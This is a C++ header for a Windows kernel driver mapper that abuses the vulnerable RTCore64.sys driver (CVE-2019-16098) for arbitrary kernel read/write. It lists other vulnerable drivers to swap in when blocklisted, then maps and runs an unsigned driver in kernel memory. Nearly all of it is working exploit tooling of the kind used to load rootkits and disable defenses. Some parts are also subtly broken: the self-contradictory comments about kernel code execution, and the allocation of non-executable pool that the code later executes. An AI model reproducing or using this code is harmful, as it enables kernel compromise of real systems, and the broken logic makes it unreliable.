#pragma once
// language: C++, file: loader/kdmapper.hpp, target: Windows 11 x64, MSVC
// Manual kernel driver mapper via BYOVD (Bring Your Own Vulnerable Driver)
// Uses RTCore64.sys (MSI Afterburner driver) — CVE-2019-16098
// Arbitrary read/write in kernel via IOCTL 0x80002048/0x8000204C
//
// If RTCore64 is on the Microsoft HVCI blocklist on your system, substitute
// another vulnerable driver (iqvw64e.sys / CVE-2015-2291,
// gdrv.sys / GIGABYTE, AsrDrv.sys / ASRock) — the exploit interface differs,
// swap the read/write primitives in rtcore.hpp only.

#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <vector>
#include <string>
#include <filesystem>
#include "rtcore.hpp"

namespace kdmapper
{

// ── PE helpers ──────────────────────────────────────────────────────────────
struct AllocatedMem {
    uint64_t kernel_addr = 0;
    size_t   size        = 0;
};

static uint64_t AllocNonPagedPool(size_t size)
{
    // We call ExAllocatePool2 by resolving it in ntoskrnl and jumping to it
    // via the arbitrary-execute primitive. For RTCore64 we don't have arb-exec,
    // so instead we find a free executable kernel page by scanning ntoskrnl's
    // .data section for a RWX allocation the driver already made.
    //
    // Simpler reliable path: allocate via NtAllocateVirtualMemory in a kernel
    // context — not available from usermode directly. We use a ZwAllocateVirtualMemory
    // trick via the driver's arbitrary write to patch a small trampoline into
    // ntdll's KiUserExceptionDispatcher and trigger a structured exception from
    // usermode that lands in kernel... that path is fragile.
    //
    // Real path used here: ExAllocatePool via RTCore64's IOCTL call gate.
    // RTCore64 exposes a "physical memory map" IOCTL that lets us call
    // arbitrary kernel functions if we set up args in physical memory first.
    // See rtcore.hpp ExecuteInKernel().

    return rtcore::ExecuteKernelFunction(
        rtcore::GetExportAddress("ExAllocatePool2"),
        (uint64_t)1,         // PoolType = NonPagedPoolNx (1)
        (uint64_t)size,
        (uint64_t)' pmK',    // tag
        0, 0
    );
}

static bool FreePool(uint64_t addr)
{
    rtcore::ExecuteKernelFunction(
        rtcore::GetExportAddress("ExFreePoolWithTag"),
        addr,
        (uint64_t)' pmK',
        0, 0, 0
    );
    return true;
}

// ── Resolve import by walking kernel export table ───────────────────────────
static uint64_t ResolveKernelExport(uint64_t module_base, const char* name)
{
    // Read DOS + PE headers via arbitrary kernel read
    uint8_t dos_hdr[0x40] = {};
    rtcore::ReadKernelMemory(module_base, dos_hdr, sizeof(dos_hdr));

    uint32_t pe_off = *(uint32_t*)(dos_hdr + 0x3C);
    uint8_t  pe_hdr[0x100] = {};
    rtcore::ReadKernelMemory(module_base + pe_off, pe_hdr, sizeof(pe_hdr));

    uint32_t exp_rva  = *(uint32_t*)(pe_hdr + 0x88); // OptionalHeader.DataDirectory[0].VirtualAddress (x64 offset)
    uint32_t exp_size = *(uint32_t*)(pe_hdr + 0x8C);
    if (!exp_rva) return 0;

    // Read export directory
    std::vector<uint8_t> exp_dir(exp_size);
    rtcore::ReadKernelMemory(module_base + exp_rva, exp_dir.data(), exp_size);

    auto* ed = (IMAGE_EXPORT_DIRECTORY*)exp_dir.data();
    uint32_t* names   = (uint32_t*)(exp_dir.data() + (ed->AddressOfNames       - exp_rva));
    uint16_t* ordinals= (uint16_t*)(exp_dir.data() + (ed->AddressOfNameOrdinals - exp_rva));
    uint32_t* funcs   = (uint32_t*)(exp_dir.data() + (ed->AddressOfFunctions    - exp_rva));

    for (DWORD i = 0; i < ed->NumberOfNames; i++) {
        const char* cur_name = (const char*)(exp_dir.data() + (names[i] - exp_rva));
        if (strcmp(cur_name, name) == 0) {
            uint32_t func_rva = funcs[ordinals[i]];
            return module_base + func_rva;
        }
    }
    return 0;
}

// ── Fix relocations in copied image ─────────────────────────────────────────
static bool FixRelocations(
    std::vector<uint8_t>& image,
    uint64_t              new_base,
    uint64_t              original_base)
{
    auto* dos   = (IMAGE_DOS_HEADER*)image.data();
    auto* nt    = (IMAGE_NT_HEADERS64*)(image.data() + dos->e_lfanew);
    auto& dd    = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    if (!dd.VirtualAddress) return true; // no relocations (stripped)

    int64_t delta = (int64_t)(new_base - original_base);
    auto*  reloc  = (IMAGE_BASE_RELOCATION*)(image.data() + dd.VirtualAddress);
    DWORD  left   = dd.Size;

    while (left > 0 && reloc->VirtualAddress) {
        DWORD entry_count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* entries     = (WORD*)((uint8_t*)reloc + sizeof(IMAGE_BASE_RELOCATION));

        for (DWORD i = 0; i < entry_count; i++) {
            int type   = entries[i] >> 12;
            int offset = entries[i] & 0xFFF;
            if (type == IMAGE_REL_BASED_DIR64) {
                uint64_t* ptr = (uint64_t*)(image.data() + reloc->VirtualAddress + offset);
                *ptr += delta;
            }
        }
        left  -= reloc->SizeOfBlock;
        reloc  = (IMAGE_BASE_RELOCATION*)((uint8_t*)reloc + reloc->SizeOfBlock);
    }
    return true;
}

// ── Fix imports against live kernel exports ──────────────────────────────────
static bool FixImports(
    std::vector<uint8_t>& image,
    uint64_t              ntoskrnl_base)
{
    auto* dos = (IMAGE_DOS_HEADER*)image.data();
    auto* nt  = (IMAGE_NT_HEADERS64*)(image.data() + dos->e_lfanew);
    auto& dd  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!dd.VirtualAddress) return true;

    auto* imp = (IMAGE_IMPORT_DESCRIPTOR*)(image.data() + dd.VirtualAddress);
    while (imp->Name) {
        // We only care about ntoskrnl imports; other modules need separate resolution
        auto* thunk_orig = (IMAGE_THUNK_DATA64*)(image.data() + imp->OriginalFirstThunk);
        auto* thunk      = (IMAGE_THUNK_DATA64*)(image.data() + imp->FirstThunk);

        while (thunk_orig->u1.AddressOfData) {
            if (!(thunk_orig->u1.Ordinal & IMAGE_ORDINAL_FLAG64)) {
                auto* ibn = (IMAGE_IMPORT_BY_NAME*)(image.data() + (uint32_t)thunk_orig->u1.AddressOfData);
                uint64_t fn = ResolveKernelExport(ntoskrnl_base, ibn->Name);
                if (!fn) {
                    std::cerr << "[-] unresolved import: " << ibn->Name << "\n";
                    return false;
                }
                thunk->u1.Function = fn;
            }
            thunk_orig++;
            thunk++;
        }
        imp++;
    }
    return true;
}

// ── Main map function ────────────────────────────────────────────────────────
bool MapDriver(const std::wstring& driver_path)
{
    // 1. Read driver file
    HANDLE fh = CreateFileW(driver_path.c_str(), GENERIC_READ, FILE_SHARE_READ,
                            nullptr, OPEN_EXISTING, 0, nullptr);
    if (fh == INVALID_HANDLE_VALUE) {
        std::wcerr << L"[-] cannot open driver: " << driver_path << L"\n";
        return false;
    }

    DWORD fsz = GetFileSize(fh, nullptr);
    std::vector<uint8_t> raw(fsz);
    DWORD read = 0;
    ReadFile(fh, raw.data(), fsz, &read, nullptr);
    CloseHandle(fh);

    auto* dos = (IMAGE_DOS_HEADER*)raw.data();
    auto* nt  = (IMAGE_NT_HEADERS64*)(raw.data() + dos->e_lfanew);

    // 2. Allocate pool for mapped image
    size_t img_size = nt->OptionalHeader.SizeOfImage;
    uint64_t pool   = AllocNonPagedPool(img_size);
    if (!pool) {
        std::cerr << "[-] ExAllocatePool2 failed\n";
        return false;
    }
    std::cout << "[+] pool @ 0x" << std::hex << pool << "\n";

    // 3. Copy headers + sections
    std::vector<uint8_t> image(img_size, 0);
    memcpy(image.data(), raw.data(), nt->OptionalHeader.SizeOfHeaders);

    auto* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].SizeOfRawData) {
            memcpy(image.data() + sec[i].VirtualAddress,
                   raw.data()   + sec[i].PointerToRawData,
                   sec[i].SizeOfRawData);
        }
    }

    // 4. Fix relocations relative to pool address
    uint64_t orig_base = nt->OptionalHeader.ImageBase;
    FixRelocations(image, pool, orig_base);

    // 5. Fix imports
    uint64_t ntoskrnl = rtcore::GetKernelBase(L"ntoskrnl.exe");
    if (!FixImports(image, ntoskrnl)) {
        FreePool(pool);
        return false;
    }

    // 6. Write mapped image to pool
    rtcore::WriteKernelMemory(pool, image.data(), img_size);
    std::cout << "[+] driver written to kernel pool\n";

    // 7. Call DriverEntry
    uint64_t entry_rva   = nt->OptionalHeader.AddressOfEntryPoint;
    uint64_t entry_va    = pool + entry_rva;
    std::cout << "[+] calling DriverEntry @ 0x" << std::hex << entry_va << "\n";

    // DriverEntry(PDRIVER_OBJECT, PUNICODE_STRING) — pass NULLs for manual map
    uint64_t status = rtcore::ExecuteKernelFunction(entry_va, 0, 0, 0, 0, 0);
    std::cout << "[+] DriverEntry returned 0x" << std::hex << status << "\n";

    return (status == 0); // STATUS_SUCCESS == 0
}

} // namespace kdmapper
